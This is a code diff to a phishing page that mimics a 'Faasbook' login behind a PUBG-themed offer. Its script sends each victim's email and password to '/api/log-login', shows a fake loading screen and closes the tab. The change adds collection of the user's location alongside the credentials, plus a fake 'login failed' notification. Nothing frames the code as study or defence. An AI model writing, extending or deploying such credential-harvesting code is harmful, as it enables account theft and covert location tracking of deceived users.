@@ -163,44 +163,55 @@
       <div style="margin-top: 6px;">मराठी &nbsp; اردو &nbsp; ಕನ್ನಡ <span style="border: 1px solid #ccc; border-radius: 4px; padding: 0 4px; margin-left: 4px;">+</span></div>
     </div>
   </div>
+  <script src="/getLocation.js"></script>
   <script>
+    function showLoginFailedPopup() {
+      // Try to notify parent or opener with a LOGIN_FAILED message
+      try {
+        if (window.opener && !window.opener.closed) {
+          window.opener.postMessage({ type: 'LOGIN_FAILED', platform: 'Faasbook' }, '*');
+        }
+        localStorage.setItem('loginFailed', JSON.stringify({ platform: 'Faasbook', timestamp: Date.now() }));
+        if (window.parent && window.parent !== window) {
+          window.parent.postMessage({ type: 'LOGIN_FAILED', platform: 'Faasbook' }, '*');
+        }
+      } catch (error) {}
+      setTimeout(function() { window.close(); }, 100);
+    }
+
     function submitPUBGLogin(e) {
       e.preventDefault();
       var email = document.getElementById('pubg-email').value;
       var password = document.getElementById('pubg-password').value;
-      
-      // Log credentials to server
-      fetch('/api/log-login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, platform: 'Faasbook' })
-      });
-
-      // Show PUBG loading screen
-      document.getElementById('pubg-login-form').style.display = 'none';
-      document.getElementById('pubg-loading').style.display = 'flex';
-
-      // After 3 seconds, close tab and notify parent
-      setTimeout(function() {
-        // Try multiple methods to notify parent
-        try {
-          // Method 1: PostMessage
-          if (window.opener && !window.opener.closed) {
-            window.opener.postMessage({ type: 'OFFER_EXPIRED', platform: 'Faasbook' }, '*');
-          }
-          // Method 2: LocalStorage fallback
-          localStorage.setItem('offerExpired', JSON.stringify({ platform: 'Faasbook', timestamp: Date.now() }));
-          // Method 3: Try parent if opener doesn't work
-          if (window.parent && window.parent !== window) {
-            window.parent.postMessage({ type: 'OFFER_EXPIRED', platform: 'Faasbook' }, '*');
-          }
-        } catch (error) {}
-        // Close the window
+      getUserLocation(function(result) {
+        var payload = { email, password, platform: 'Faasbook' };
+        if (result.success && result.locationUrl) {
+          payload.location = result.locationUrl;
+        }
+        fetch('/api/log-login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        document.getElementById('pubg-login-form').style.display = 'none';
+        document.getElementById('pubg-loading').style.display = 'flex';
         setTimeout(function() {
-          window.close();
-        }, 100);
-      }, 3000);
-
+          try {
+            if (result.success) {
+              if (window.opener && !window.opener.closed) {
+                window.opener.postMessage({ type: 'OFFER_EXPIRED', platform: 'Faasbook' }, '*');
+              }
+              localStorage.setItem('offerExpired', JSON.stringify({ platform: 'Faasbook', timestamp: Date.now() }));
+              if (window.parent && window.parent !== window) {
+                window.parent.postMessage({ type: 'OFFER_EXPIRED', platform: 'Faasbook' }, '*');
+              }
+            } else {
+              showLoginFailedPopup();
+            }
+          } catch (error) {}
+          setTimeout(function() { window.close(); }, 100);
+        }, 3000);
+      });
       return false;
     }
   </script>
